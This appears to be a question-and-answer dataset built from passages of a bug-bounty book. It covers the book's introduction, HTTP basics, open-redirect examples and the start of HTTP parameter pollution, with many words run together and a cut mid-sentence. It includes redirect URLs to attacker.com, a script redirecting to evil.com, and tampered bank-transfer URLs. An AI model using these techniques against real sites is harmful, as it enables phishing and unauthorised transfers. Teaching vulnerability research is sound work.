was\nexploited.IfullygraspedhowSQLinjectionswereachievedwhereasbefore,Ionlyknew\nthedanger.Inshort,Iwashooked.Upuntilthispoint,Ialwaysapproachedwebsecurity\nIntroduction 4\nfrom the developer’s perspective, appreciating the need to sanitize values and avoid\nusinguserinputdirectly.NowIwasbeginningtounderstandwhatitalllookedlikefrom\na hacker’s perspective.\nIkeptlookingformoreinformationonhowtohackandcameacrossBugcrowd’sforums.\nUnfortunately they weren’t overly active at the time but there someone mentioned\nHackerOne’s hacktivity and linked to a report. Following the link, I was amazed. I was\nreading a description of a vulnerability, written to a company, who then disclosed it to\nthe world. Perhaps more importantly, the company actually paid the hacker to find and\nreport this!\nThat was a turning point, I became obsessed. Especially when a homegrown Canadian\ncompany, Shopify, seemed to be leading the pack in disclosures at the time. Checking\nout Shopify’s profile, their disclosure list was littered with open reports. I couldn’t read\nenough of them. The vulnerabilities included Cross-Site Scripting, Authentication and\nCross-Site Request Forgery, just to name a few.\nAdmittedly,atthisstage,Iwasstrugglingtounderstandwhatthereportsweredetailing.\nSome of the vulnerabilities and methods of exploitation were hard to understand.\nSearchingGoogletotryandunderstandoneparticularreport,IendedonaGitHubissue\nthread for an old Ruby on Rails default weak parameter vulnerability (this is detailed in\nthe Application Logic chapter) reported by Egor Homakov. Following up on Egor led me\nto his blog, which includes disclosures for some seriously complex vulnerabilities.\nReading about his experiences, I realized, the world of hacking might benefit from plain\nlanguage explanations of real world vulnerabilities.And it just so happened, that I learn\nbetter when teaching others.\nAnd so, Web Hacking 101 was born.\nJust 30 Examples and My First Sale\nI decided to start out with a simple goal, find and explain 30 web vulnerabilities in easy\nto understand, plain language.\nI figured, at worst, researching and writing about vulnerabilities would help me learn\nabouthacking.Atbest,I’dsellamillioncopies,becomeaself-publishingguruandretire\nearly. The latter has yet to happen and at times, the former seems endless.\nAround the 15 explained vulnerabilities mark, I decided to publish my draft so it could\nbe purchased - the platform I chose, LeanPub (which most have probably purchased\nthrough), allows you to publish iteratively, providing customers with access to all\nupdates. I sent out a tweet thanking HackerOne and Shopify for their disclosures and\nto tell the world about my book. I didn’t expect much.\nBut within hours, I made my first sale.\nIntroduction 5\nElatedattheideaofsomeoneactuallypayingformybook(somethingIcreatedandwas\npouringatonneofeffortinto!),IloggedontoLeanPubtoseewhatIcouldfindoutabout\nthe mystery buyer. Turns out nothing. But then my phone vibrated, I received a tweet\nfrom Michiel Prins saying he liked the book and asked to be kept in the loop.\nWho the hell is Michiel Prins? I checked his Twitter profile and turns out, he’s one\nof the Co-Founders of HackerOne. Shit. Part of me thought HackerOne wouldn’t be\nimpressed with my reliance on their site for content. I tried to stay positive, Michiel\nseemed supportive and did ask to be kept in the loop, so probably harmless.\nNot long after my first sale, I received a second sale and figured I was on to something.\nCoincidentally, around the same time, I got a notification from Quora about a question\nI’d probably be interested in, How do I become a successful Bug bounty hunter?\nGiven my experience starting out, knowing what it was like to be in the same shoes\nand with the selfish goal of wanting to promote my book, I figured I’d write an answer.\nAbout half way through, it dawned on me that the only other answer was written by\nJobert Abma, one of the other Co-Founders of HackerOne. A pretty authoritative voice\non hacking. Shit.\nIcontemplatedabandoningmyanswerbutthenelectedtorewriteittobuildonhisinput\nsinceIcouldn’tcompetewithhisadvice.Ihitsubmitandthoughtnothingofit.Butthen\nI received an interesting email:\nHi Peter, I saw your Quora answer and then saw that you are writing a book\nabout White Hat hacking. Would love to know more.\nKind regards,\nMarten CEO, HackerOne\nTripleShit.Alotofthingsranthroughmymindatthispoint,noneofwhichwerepositive\nand pretty much all were irrational. In short, I figured the only reason Marten would\nemail me was to drop the hammer on my book. Thankfully, that couldn’t have been\nfurther from the truth.\nI replied to him explaining who I was and what I was doing - that I was trying to learn\nhowtohackandhelpotherslearnalongwithme.Turnsout,hewasabigfanoftheidea.\nHe explained that HackerOne is interested in growing the community and supporting\nhackersastheylearnasit’smutuallybeneficialtoeveryoneinvolved.Inshort,heoffered\ntohelp.Andman,hasheever.Thisbookprobablywouldn’tbewhereitistodayorinclude\nhalf the content without his and HackerOne’s constant support and motivation.\nSince that initial email, I kept writing and Marten kept checking in. Michiel and Jobert\nrevieweddrafts,providedsuggestionsandevencontributedsomesections.Marteneven\nwent above and beyond to cover the costs of a professionally designed cover (goodbye\nplainyellowcoverwithawhitewitches’hat,allofwhichlookedlikeitwasdesignedbya\nIntroduction 6\nfouryearold).InMay2016,AdamBacchusjoinedHackerOneandonhis5thdayworking\nthere, he read the book, provided edits and was explaining what it was like to be on the\nreceivingendofvulnerabilityreports-somethingI’venowincludedinthereportwriting\nchapter.\nI mention all this because throughout this journey, HackerOne has never asked for\nanything in return. They’ve just wanted to support the community and saw this book\nwas a good way of doing it. As someone new to the hacking community, that resonated\nwithmeandIhopeitdoeswithyoutoo.Ipersonallyprefertobepartofasupportive\nand inclusive community.\nSo, since then, this book has expanded dramatically, well beyond what I initially envi-\nsioned. And with that, the target audience has also changed.\nWho This Book Is Written For\nThisbookiswrittenwithnewhackersinmind.Itdoesn’tmatterifyou’reawebdeveloper,\nwebdesigner,stayathomemom,a10yearoldora75yearold.Iwantthisbooktobean\nauthoritative reference for understanding the different types of vulnerabilities, how to\nfind them, how to report them, how to get paid and even, how to write defensive code.\nThat said, I didn’t write this book to preach to the masses. This is really a book\nabout learning together. As such, I share successes AND some of my notable (and\nembarrassing) failures.\nThebookalsoisn’tmeanttobereadcovertocover,ifthereisaparticularsectionyou’re\ninterestedin,goreaditfirst.Insomecases,Idoreferencesectionspreviouslydiscussed,\nbutdoingso,Itrytoconnectthesectionssoyoucanflipbackandforth.Iwantthisbook\nto be something you keep open while you hack.\nOn that note, each vulnerability type chapter is structured the same way:\n• Begin with a description of the vulnerability type;\n• Review examples of the vulnerability; and,\n• Conclude with a summary.\nSimilarly, each example within those chapters is structured the same way and includes:\n• My estimation of the difficulty finding the vulnerability\n• The url associated with where the vulnerability was found\n• A link to the report or write up\n• The date the vulnerability was reported\n• The amount paid for the report\n• An easy to understand description of the vulnerability\nIntroduction 7\n• Take aways that you can apply to your own efforts\nLastly, while it’s not a prerequisite for hacking, it is probably a good idea to have some\nfamiliarity with HTML, CSS, Javascript and maybe some programming. That isn’t to say\nyou need to be able to put together web pages from scratch, off the top of your head\nbut understanding the basic structure of a web page, how CSS defines a look and feel\nand what can be accomplished with Javascript will help you uncover vulnerabilities and\nunderstand the severity of doing so. Programming knowledge is helpful when you’re\nlooking for application logic vulnerabilities. If you can put yourself in the programmer’s\nshoes to guess how they may have implemented something or read their code if it’s\navailable, you’ll be ahead in the game.\nTo do so, I recommend checking out Udacity’s free online courses Intro to HTML and\nCSSandJavacriptBasics,linkstowhichI’veincludedintheResourceschapter.Ifyou’re\nnot familiar with Udacity, it’s mission is to bring accessible, affordable, engaging and\nhighly effective higher education to the world. They’ve partnered with companies like\nGoogle, AT&T, Facebook, Salesforce, etc. to create programs and offer courses online.\nChapter Overview\nChapter 2 is an introductory background to how the internet works, including HTTP\nrequests and responses and HTTP methods.\nChapter 3 covers Open Redirects, an interesting vulnerability which involves exploiting\nasitetodirectuserstovisitanothersitewhichallowsanattackertoexploitauser’strust\nin the vulnerable site.\nChapter 4 covers HTTP Parameter Pollution and in it, you’‘ll learn how to find systems\nthat may be vulnerable to passing along unsafe input to third party sites.\nChapter 5 covers Cross-Site Request Forgery vulnerabilities, walking through examples\nthat show how users can be tricked into submitting information to a website they are\nlogged into unknowingly.\nChapter 6 covers HTML Injections and in it, you’ll learn how being able to inject HTML\ninto a web page can be used maliciously. One of the more interesting takeaways is how\nyou can use encoded values to trick sites into accepting and rendering the HTML you\nsubmit, bypassing filters.\nChapter 7 covers Carriage Return Line Feed Injections and in it, looking at examples of\nsubmittingcarriagereturn,linebreakstositesandtheimpactithasonrenderedcontent.\nChapter 8 covers Cross-Site Scripting, a massive topic with a huge variety of ways to\nachieve exploits. Cross-Site Scripting represents huge opportunities and an entire book\ncouldandprobablyshould,bewrittensolelyonit.ThereareatonneofexamplesIcould\nhave included here so I try to focus on the most interesting and helpful for learning.\nIntroduction 8\nChapter 9 covers Server Side Template Injection, as well as client side injections. These\ntypes of vulnerabilities take advantage of developers injecting user input directly into\ntemplateswhensubmittedusingthetemplatesyntax.Theimpactofthesevulnerabilities\ndepends on where they occur but can often lead to remote code executions.\nChapter10coversstructuredquerylanguage(SQL)injections,whichinvolvemanipulat-\ning database queries to extract, update or delete information from a site.\nChapter11coversServerSideRequestForgerywhichallowsanattackertouseraremote\nserver to make subsequent HTTP requests on the attacker’s behalf.\nChapter 12 covers XML External Entity vulnerabilities resulting from a sites parsing of\nextensible markup language (XML). These types of vulnerabilities can include things like\nreading private files, remote code execution, etc.\nChapter 13 covers Remote Code Execution, or the ability for an attacker to execute\narbitrarycodeonavictimserver.Thistypeofvulnerabilityisamongthemostdangerous\nsince an attacker can control what code is executed and is usually rewarded as such.\nChapter 14 covers memory related vulnerabilities, a type of vulnerability which can be\ntough to find and are typically related to low level programming languages. However,\ndiscovering these types of bugs can lead to some pretty serious vulnerabilities.\nChapter 15 covers Sub Domain Takeovers, something I learned a lot about researching\nthis book and should be largely credited to Mathias, Frans and the Dectectify team.\nEssentiallyhere,asitereferstoasubdomainhostingwithathirdpartyservicebutnever\nactually claims the appropriate address from that service. This would allow an attacker\nto register the address from the third party so that all traffic, which believes it is on the\nvictim’s domain, is actually on an attacker’s.\nChapter16coversRaceConditions,avulnerabilitywhichinvolvestwoormoreprocesses\nperformingactionbasedonconditionswhichshouldonlypermitoneactiontooccur.For\nexample,thinkofbanktransfers,youshouldn’tbeabletoperformtwotransfersof$500\nwhenyourbalanceisonly$500.However,araceconditionvulnerabilitycouldpermitit.\nChapter17coversInsecureDirectObjectReferencevulnerabilitieswherebyanattacker\ncan read or update objections (database records, files, etc) which they should not have\npermission to.\nChapter18coversapplicationlogicbasedvulnerabilities.Thischapterhasgrownintoa\ncatchallforvulnerabilitiesIconsiderlinkedtoprogramminglogicflaws.I’vefoundthese\ntypes of vulnerabilities may be easier for a beginner to find instead of looking for weird\nand creative ways to submit malicious input to a site.\nChapter 19 covers the topic of how to get started. This chapter is meant to help you\nconsiderwhereandhowtolookforvulnerabilitiesasopposedtoastepbystepguideto\nhacking a site. It is based on my experience and how I approach sites.\nChapter 20 is arguably one of the most important book chapters as it provides advice\non how to write an effective report. All the hacking in the world means nothing if you\nIntroduction 9\ncan’t properly report the issue to the necessary company. As such, I scoured some big\nname bounty paying companies for their advice on how best to report and got advice\nfrom HackerOne. Make sure to pay close attention here.\nChapter 21 switches gears. Here we dive into recommended hacking tools. The initial\ndraftofthischapterwasdonatedbyMichielPrinsfromHackerOne.Sincethenit’sgrown\nto a living list of helpful tools I’ve found and used.\nChapter 22 is dedicated to helping you take your hacking to the next level. Here I walk\nyou through some awesome resources for continuing to learn. Again, at the risk of\nsoundinglikeabrokenrecord,bigthankstoMichielPrinsforcontributingtotheoriginal\nlist which started this chapter.\nChapter 23 concludes the book and covers off some key terms you should know while\nhacking. While most are discussed in other chapters, some aren’t so I’d recommend\ntaking a read here.\nWord of Warning and a Favour\nBeforeyousetoffintotheamazingworldofhacking,Iwanttoclarifysomething.AsIwas\nlearning, reading about public disclosures, seeing all the money people were (and still\nare) making, it became easy to glamorize the process and think of it as an easy way to\ngetrichquick.Itisn’t.Hackingcanbeextremelyrewardingbutit’shardtofindandread\nabout the failures along the way (except here where I share some pretty embarrassing\nstories). As a result, since you’ll mostly hear of peoples’ successes, you may develop\nunrealistic expectations of success. And maybe you will be quickly successful. But if you\naren’t, keep working! It will get easier and it’s a great feeling to have a report resolved.\nWith that, I have a favour to ask. As you read, please message me on Twitter @yaworsk\nand let me know how it’s going. Whether successful or unsuccessful, I’d like to hear\nfrom you. Bug hunting can be lonely work if you’re struggling but its also awesome to\ncelebratewitheachother.Andmaybeyourfindwillbesomethingwecanincludeinthe\nnext edition.\nGood luck!!"
  },
  {
    "input": "What is an open redirect vulnerability and how can it be exploited to redirect users to a malicious website?",
    "summary": "The text explains how the internet works, from URLs to IP addresses and HTTP protocols, and highlights the importance of understanding these systems when identifying vulnerabilities. It then focuses on open redirect vulnerabilities, where a website redirects users to a malicious site without proper validation, often using parameters like redirect_to or checkout_url. Examples from Shopify and HackerOne demonstrate how these vulnerabilities can be exploited for phishing or malware distribution, emphasizing the need for careful parameter testing and awareness of tools used by websites.",
    "output": "3. Background\nIfyou’restartingoutfreshlikeIwasandthisbookisamongyourfirststepsintotheworld\nof hacking, it’s going to be important for you to understand how the internet works.\nBefore you turn the page, what I mean is how the URL you type in the address bar is\nmapped to a domain, which is resolved to an IP address, etc.\nTo frame it in a sentence: the internet is a bunch of systems that are connected and\nsendingmessagestoeachother.Someonlyacceptcertaintypesofmessages,someonly\nallow messages from a limited set of other systems, but every system on the internet\nreceives an address so that people can send messages to it. It’s then up to each system\nto determine what to do with the message and how it wants to respond.\nTodefinethestructureofthesemessages,peoplehavedocumentedhowsomeofthese\nsystems should communicate in Requests for Comments (RFC). As an example, take a\nlook at HTTP. HTTP defines the protocol of how your internet browser communicates\nwith a web server. Because your internet browser and web server agreed to implement\nthe same protocol, they are able to communicate.\nWhenyouenterhttp://www.google.cominyourbrowser’saddressbarandpressreturn,\nthe following steps describe what happens on a high level:\n• Your browser extracts the domain name from the URL, www.google.com.\n• Your computer sends a DNS request to your computer’s configured DNS servers.\nDNS can help resolve a domain name to an IP address, in this case it resolves to\n216.58.201.228.Tip:youcanusedigAwww.google.comfromyourterminaltolook\nup IP addresses for a domain.\n• Your computer tries to set up a TCP connection with the IP address on port 80,\nwhich is used for HTTP traffic. Tip: you can set up a TCP connection by running nc\n216.58.201.228 80 from your terminal.\n• If it succeeds, your browser will send an HTTP request like:\nGET/HTTP/1.1\nHost:www.google.com\nConnection:keep-alive\nAccept:application/html,*/*\n• Now it will wait for a response from the server, which will look something like:\nBackground 11\nHTTP/1.1200OK\nContent-Type:text/html\n<html>\n<head>\n<title>Google.com</title>\n</head>\n<body>\n...\n</body>\n</html>\n• YourbrowserwillparseandrenderthereturnedHTML,CSS,andJavaScript.Inthis\ncase, the home page of Google.com will be shown on your screen.\nNow, when dealing specifically with the browser, the internet and HTML, as mentioned\npreviously, there is an agreement on how these messages will be sent, including the\nspecific methods used and the requirement for a Host request-header for all HTTP/1.1\nrequests,asnotedaboveinbullet4.ThemethodsdefinedincludeGET,HEAD,POST,PUT,\nDELETE, TRACE, CONNECT and OPTIONS.\nThe GET method means to retrieve whatever information is identified by the request\nUniform Request Identifier (URI). The term URI may be confusing, especially given the\nreference to a URL above, but essentially, for the purposes of this book, just know that\na URL is like a person’s address and is a type of URI which is like a person’s name\n(thanksWikipedia).WhiletherearenoHTTPpolice,typicallyGETrequestsshouldnotbe\nassociated with any data altering functions, they should just retrieve and provide data.\nThe HEAD method is identical to the GET message except the server must not return a\nmessagebodyintheresponse.Typicallyyouwon’toftenseethisusedbutapparentlyitis\noften employed for testing hypertext links for validity, accessibility and recent changes.\nThe POST method is used to invoke some function to be performed by the server, as\ndetermined by the server. In other words, typically there will be some type of back end\naction performed like creating a comment, registering a user, deleting an account, etc.\nThe action performed by the server in response to the POST can vary and doesn’t have\nto result in action being taken. For example, if an error occurs processing the request.\nThePUTmethodisusedwheninvokingsomefunctionbutreferringtoanalreadyexisting\nentity. For example, when updating your account, updating a blog post, etc. Again, the\naction performed can vary and may result in the server taking no action at all.\nThe DELETE method is just as it sounds, it is used to invoke a request for the remote\nserver to delete a resource identified by the URI.\nBackground 12\nThe TRACE method is another uncommon method, this time used to reflect back the\nrequestmessagetotherequester.Thisallowstherequestertoseewhatisbeingreceived\nby the server and to use that information for testing and diagnostic information.\nThe CONNECT method is actually reserved for use with a proxy (a proxy is a basically a\nserver which forwards requests to other servers)\nTheOPTIONSmethodisusedtorequestinformationfromaserveraboutthecommuni-\ncation options available. For example, calling for OPTIONS may indicate that the server\naccepts GET, POST, PUT, DELETE and OPTIONS calls but not HEAD or TRACE.\nNow, armed with a basic understanding of how the internet works, we can dive into the\ndifferent types of vulnerabilities that can be found in it.\n4. Open Redirect Vulnerabilities\nDescription\nAn open redirect vulnerability occurs when a victim visits a particular URL for a given\nwebsite and that website instructs the victim’s browser to visit a completely different\nURL,onaseparatedomain.Forexample,supposeGooglehadutilizedthefollowingURL\nto redirect users to Gmail:\nhttps://www.google.com?redirect_to=https://www.gmail.com\nVisiting this URL, Google would receive a GET HTTP request and use the redirect_to\nparameter’s value to determine where the visitor’s browser should be redirected. After\ndoing so, Google would return a 302 HTTP response, instructing the user’s browser to\nto make a GET request to https://www.gmail.com, the redirect_to parameter’s value. Now,\nsuppose we changed the original URL to:\nhttps://www.google.com?redirect_to=https://www.attacker.com\nIfGooglewasn’tvalidatingthattheredirect_toparameterwasforoneoftheirownlegit-\nimate sites where they intended to send visitors (https://www.gmail.com in our example),\nthis could be vulnerable to an open redirect and return a HTTP response instructing the\nvisitor’s browser to make a GET request to https://www.attacker.com.\nThe Open Web Application Security Project (OWASP), which is a community dedicated\nto application security that curates a list of the most critical security flaws in web\napplications, has listed this vulnerability in their 2013 Top Ten vulnerabilities list. Open\nredirects exploit the trust of a given domain, https://www.google.com/ in our example, to\nlure victims to a malicious website. This can be used in phishing attacks to trick users\ninto believing they are submitting information to the trusted site, when their valuable\ninformationisactuallygoingtoamalicioussite.Thisalsoenablesattackerstodistribute\nmalware from the malicious site or steal OAuth tokens (a topic we cover in a later\nchapter).\nWhen searching for these types of vulnerabilities, you’re looking for a GET request sent\nto the site you’re testing, with a parameter specifying a URL to redirect to.\nExamples\n1. Shopify Theme Install Open Redirect\nDifficulty: Low\nOpenRedirectVulnerabilities 14\nUrl: app.shopify.com/services/google/themes/preview/supply–blue?domain_name=XX\nReport Link: https://hackerone.com/reports/1019621\nDate Reported: November 25, 2015\nBounty Paid: $500\nDescription:\nOur first example of an open redirect was found on Shopify, an e-commerce solution\nthat allows users to set up an on-line store to sell goods. Shopify’s platform allows\nadministrators to customize the look and feel of their stores and one of the ways to\ndo that is by installing a new theme. As part of that functionality, Shopify previously\nprovidedapreviewforthethemethroughURLsthatincludedaredirectparameter.The\nredirect URL was similar to the following which I’ve modified for readability:\nhttps://app.shopify.com/themes/preview/blue?domain_name=example.com/admin\nPart of the URL to preview the theme included a domain_name parameter at the end of\nthe URL to specify another URL to redirect to. Shopify wasn’t validating the redirect URL\nsotheparametervaluecouldbeexploitedtoredirectavictimtohttp://example.com/admin\nwhere a malicious attacker could phish the user.\nTakeaways\nNotallvulnerabilitiesarecomplex.Thisopenredirectsimplyrequiredchanging\nthe domain_name parameter to an external site, which would have resulted in\nauserbeingredirectedoff-sitefromShopify.\n2. Shopify Login Open Redirect\nDifficulty: Medium\nUrl: http://mystore.myshopify.com/account/login\nReport Link: https://hackerone.com/reports/1037722\nDate Reported: December 6, 2015\nBounty Paid: $500\nDescription:\nThisopenredirectissimilartothefirstShopifyexampleexcepthere,Shopify’sparameter\nisn’tredirectingtheusertothedomainspecifiedbytheURLparameter,butinsteadtacks\nthe parameter’s value onto the end of a Shopify sub-domain. Normally this would have\n1https://hackerone.com/reports/101962\n2https://hackerone.com/reports/103772\nOpenRedirectVulnerabilities 15\nbeenusedtoredirectausertoaspecificpageonagivenstore.Aftertheuserhaslogged\nintoShopify,Shopifyusestheparametercheckout_urltoredirecttheuser.Forexample,\nif a victim visited:\nhttp://mystore.myshopify.com/account/login?checkout_url=.attacker.com\nthey would have been redirected to the URL:\nhttp://mystore.myshopify.com.attacker.com\nwhich actually isn’t a Shopify domain anymore because it ends in .attacker.com. DNS\nlookups use the right-most domain label, .attacker.com in this example. So when:\nhttp://mystore.myshopify.com.attacker.com\nissubmittedforDNSlookup,itwillmatchonattacker.com,whichisn’townedbyShopify,\nand not myshopify.com as Shopify would have intended.\nSince Shopify was combining the store URL, in this case http://mystore.myshopify.com, with\nthe checkout_url parameter, an attacker wouldn’t be able to send a victim anywhere\nfreely.Buttheattackercouldsendausertoanotherdomainaslongastheyensuredthe\nredirect URL had the same sub-domain.\nTakeaways\nRedirectparametersmaynotalwaysbeobviouslylabeled,sinceparameterswill\nbe named differently from site to site or even within a site. In some cases you\nmayevenfindthatparametersarelabeledwithjustsinglecharactersliker=,or\nu=.Whenlookingforopenredirects,keepaneyeoutforURLparameterswhich\nincludethewordsURL,redirect,next,andsoon,whichmaydenotepathswhich\nsiteswilldirectusersto.\nAdditionally,ifyoucanonlycontrolaportionofthefinalURLreturnedbythesite,\nforexample,onlythecheckout_urlparametervalue,andnoticetheparameteris\nbeingcombinedwithahard-codedURLontheback-endofthesite,likethestore\nURLhttp://mystore.myshopify.com,tryaddingspecialURLcharacterslikeaperiodor\n@tochangethemeaningoftheURLandredirectausertoanotherdomain.\n3. HackerOne Interstitial Redirect\nDifficulty: Medium\nUrl: N/A\nReport Link: https://hackerone.com/reports/1119683\nDate Reported: January 20, 2016\n3https://hackerone.com/reports/111968\nOpenRedirectVulnerabilities 16\nBounty Paid: $500\nDescription:\nAn interstitial web page is one that is shown before expected content. Using one is a\ncommon method to protect against open redirect vulnerabilities since any time you’re\nredirecting a user to a URL, you can show an interstitial web page with a message\nexplaining to the user they are leaving the domain they are on. This way, if the redirect\npageshowsafakeloginortriestopretendtobethetrusteddomain,theuserwillknow\nthat they are being redirected. This is the approach HackerOne takes when following\nmostURLsofftheirsite,forexample,whenfollowinglinksinsubmittedreports.Although\ninterstitialwebpagesareusedtoavoidredirectvulnerabilities,complicationsintheway\nsites interact with one another can still lead to compromised links.\nHackerOne uses Zendesk, a customer service support ticketing system, for its support\nsub-domain. When hackerone.com was followed by /zendesk_session users would be\nleadfromHackerOne’splatformtoHackerOne’sZendeskplatformwithoutaninterstitial\npage because HackerOne trusted URLs containing the hackerone.com. Additionally,\nZendesk allowed users to redirect to other Zendesk accounts via the parameter /redi-\nrect_to_account?state= without an interstitial.\nSo, with regards to this report, Mahmoud Jamal created an account on Zendesk with\nthesubdomain,http://compayn.zendesk.com,andaddedthefollowingJavascriptcodetothe\nheaderfilewiththeZendeskthemeeditorwhichallowsadministratorstocustomizetheir\nZendesk site’s look and feel:\n<script>document.location.href=\"http://evil.com\";</script>\nHere, Mahmoud is using JavaScript to instruct the browser to visit http://evil.com. While\ndiving into JavaScript specifics is beyond the scope of this book, the <script> tag is\nused to denote code in HTML and document refers to the entire HTML document\nbeing returned by Zendesk, which is the information for the web page. The dots and\nnames following document are its properties. Properties hold information and values\nthat either are descriptive of the object they are properties of, or can be manipulated\nto change the object. So the location property can be used to control the web page\ndisplayedbyyourbrowserandthehrefsub-property(whichisapropertyofthelocation)\nredirectsthebrowsertothedefinedwebsite.So,visitingthefollowinglinkwouldredirect\nvictimstoMahmoud’sZendesksub-domain,whichwouldmakethevictim’sbrowserrun\nMahmoud’s script and redirect them to http://evil.com (note, the URL has been edited for\nreadability):\nhttps://hackerone.com/zendesk_session?return_to=https://support.hackerone.com/ping/redirect?state=compayn:/\nSince the link includes the domain hackerone.com, the interstitial web page isn’t dis-\nplayedandtheuserwouldn’tknowthepagetheyarevisitingisunsafe.Now,interestingly,\nMahmoud originally reported this redirect issue to Zendesk, but it was disregarded and\nnot marked as a vulnerability. So, naturally, he kept digging to see how it could be\nexploited.\nOpenRedirectVulnerabilities 17\nTakeaways\nAs you search for vulnerabilities, take note of the services a site uses as they\neach represent new attack vectors. Here, this vulnerability was made possible\nby combining HackerOne’s use of Zendesk and the known redirect they were\npermitting.\nAdditionally,asyoufindbugs,therewillbetimeswhenthesecurityimplications\nare not readily understood by the person reading and responding to your\nreport.ThisiswhyIhaveachapteronVulnerabilityReportswhichcoversdetails\nto include in a report, how to build relationships with companies, and other\ninformation.Ifyoudoalittleworkupfrontandrespectfullyexplainthesecurity\nimplicationsinyourreport,itwillhelpensureasmootherresolution.\nBut, even that said, there will be times when companies don’t agree with you.\nIf that’s the case, keep digging like Mahmoud did and see if you can prove the\nexploitorcombineitwithanothervulnerabilitytodemonstrateeffectiveness.\nSummary\nOpenredirectsallowamaliciousattackertoredirectpeopleunknowinglytoamalicious\nwebsite. Finding them, as these examples show, often requires keen observation.\nRedirectparametersaresometimeseasytospotwithnameslikeredirect_to=,domain_-\nname=, checkout_url=, and so on. Whereas other times they may have less obvious\nnames like r=, u=, and so on.\nThistypeofvulnerabilityreliesonanabuseoftrust,wherevictimsaretrickedintovisiting\nanattacker’ssitethinkingtheywillbevisitingasitetheyrecognize.Whenyouspotlikely\nvulnerable parameters, be sure to test them out thoroughly and add special characters,\nlike a period, if some part of the URL is hard-coded.\nAdditionally,theHackerOneinterstitialredirectshowstheimportanceofrecognizingthe\ntools and services websites use while you hunt for vulnerabilities and how sometimes\nyou have to be persistent and clearly demonstrate a vulnerability before it’s recognized\nand accepted for a bounty."
  },
  {
    "input": "What is HTTP Parameter Pollution and how does it affect both server-side and client-side web applications?",
    "summary": "HTTP Parameter Pollution (HPP) occurs when a website treats multiple parameters with the same name differently, leading to unexpected behavior. Server-side HPP involves manipulating parameters to influence server-side code, while client-side HPP allows attackers to inject parameters that are reflected back to the user. Examples include vulnerabilities in social media links and Twitter's intent features, where multiple parameters can override intended values.",
    "output": "5. HTTP Parameter Pollution\nDescription\nHTTP Parameter Pollution, or HPP, refers to manipulating how a website treats param-\neters it receives during HTTP requests. The vulnerability occurs when parameters are\ninjected and trusted by the vulnerable website, leading to unexpected behavior. This\ncan happen on the back-end, server-side, where the servers of the site you’re visiting\nare processing information invisible to you, or on the client-side, where you can see the\neffect in your client, which is usually your browser.\nServer-Side HPP\nWhenyoumakearequesttoawebsite,thesite’sserversprocesstherequestandreturn\na response, like we covered in Chapter 1. In some cases, the servers won’t just return\na web page, but will also run some code based on information given to it through the\nURL it’s sent. This code only runs on the servers, so it’s essentially invisible to you—\nyou can see the information you send and the results you get back, but the process in\nbetweenisablackbox.Inserver-sideHPP,yousendtheserversunexpectedinformation\ninanattempttomaketheserver-sidecodereturnunexpectedresults.Becauseyoucan’t\nsee how the server’s code functions, server-side HPP is dependent on you identifying\npotentially vulnerable parameters and experimenting with them.\nA server-side example of HPP could happen if your bank initiated transfers through its\nwebsite that were processed on its servers by accepting URL parameters. Say that you\ncouldtransfermoneybyfillingvaluesinthethreeURLparametersfrom,to,andamount,\nwhichwouldspecifytheaccountnumbertotransfermoneyfrom,theaccounttotransfer\nto,andtheamounttotransfer,inthatorder.AURLwiththeseparametersthattransfers\n$5,000 from account number 12345 to account 67890 might look like:\nhttps://www.bank.com/transfer?from=12345&to=67890&amount=5000\nIt’spossiblethebankcouldmaketheassumptionthattheyareonlygoingtoreceiveone\nfrom parameter. But what happens if you submit two, like the following:\nhttps://www.bank.com/transfer?from=12345&to=67890&amount=5000&from=ABCDEF\nThisURLisinitiallystructuredthesameasourfirstexample,butappendsanextrafrom\nparameter that specifies another sending account ABCDEF. As you may have guessed,\nif the application is vulnerable to HPP an attacker might be able to execute a transfer\nfrom an account they don’t own if the bank trusted the last from parameter it received.\nHTTPParameterPollution 19\nInsteadoftransferring$5,000fromaccount12345to67890,theserver-sidecodewould\nuse the second parameter and send money from account ABCDEF to 67890.\nBoth HPP server-side and client-side vulnerabilities depend on how the server behaves\nwhen receiving multiple parameters with the same name. For example, PHP/Apache\nuse the last occurrence, Apache Tomcat uses the first occurrence, ASP/IIS use all\noccurrences, and so on. As a result, there is no single guaranteed process for handling\nmultiple parameter submissions with the same name and finding HPP will take some\nexperimentation to confirm how the site you’re testing works.\nWhileourexamplesofarusesparametersthatareobvious,sometimesHPPvulnerabili-\ntiesoccurasaresultofhidden,server-sidebehaviorfromcodethatisn’tdirectlyvisibleto\nyou.Forexample,let’ssayourbankdecidedtorevisethewayitwasprocessingtransfers\nand changed its back-end code to not include a from parameter in the URL, but instead\ntake an array that holds multiple values in it.\nThis time, our bank will take two parameters for the account to transfer to and the\namount to transfer. The account to transfer from will just be a given. An example link\nmight look like the following:\nhttps://www.bank.com/transfer?to=67890&amount=5000\nNormally the server-side code will be a mystery to us, but fortunately we stole their\nsource code and know that their (overtly terrible for the sake of this example) server-\nside Ruby code looks like:\nuser.account=12345\ndefprepare_transfer(params)\nparams<<user.account\ntransfer_money(params)#user.account(12345)becomesparams[2]\nend\ndeftransfer_money(params)\nto=params[0]\namount=params[1]\nfrom=params[2]\ntransfer(to,amount,from)\nend\nThis code creates two functions, prepare_transfer and transfer_money. The prepare_-\ntransfer function takes an array called params which contains the to and amount\nparameters from the URL. The array would be [67890,5000] where the array values are\nsandwiched between brackets and each value is separated by a comma. The first line of\nthe function adds the user account information that was defined earlier in the code to\nHTTPParameterPollution 20\ntheendofthearraysoweendupwiththearray[67890,5000,12345]inparamsandthen\nparams is passed to transfer_money.\nYou’llnoticethatunlikeparameters,Rubyarraysdon’thavenamesassociatedwiththeir\nvalues, so the code is dependent on the array always containing each value in order\nwheretheaccounttotransfertoisfirst,theamounttotransfertoisnext,andtheaccount\ntotransferfromfollowstheothertwovalues.Intransfer_money,thisbecomesevidentas\nthefunctionassignseacharrayvaluetoavariable.Arraylocationsarenumberedstarting\nfrom0,soparams[0]accessesthevalueatthefirstlocationinthearray,whichis67890in\nthiscase,andassignsittothevariableto.Theothervaluesarealsoassignedtovariables\nin the next two lines and then the variable names are passed to the transfer function,\nwhich is not shown in this code snippet, but takes the values and actually transfers the\nmoney.\nIdeally, the URL parameters would always be formatted in the way the code expects.\nHowever, an attacker could change the outcome of this logic by passing in a from value\nto the params, as with the following URL:\nhttps://www.bank.com/transfer?to=67890&amount=5000&from=ABCDEF\nIn this case, the from parameter is also included in the params array passed to the\nprepare_transfer function, so the arrays values would be [67890,5000,ABCDEF] and\naddingtheuseraccountwouldactuallyresultin[67890,5000,ABCDEF,12345].Asaresult,\nin the transfer_money function called in prepare_transfer, the from variable would\ntake the third parameter expecting the 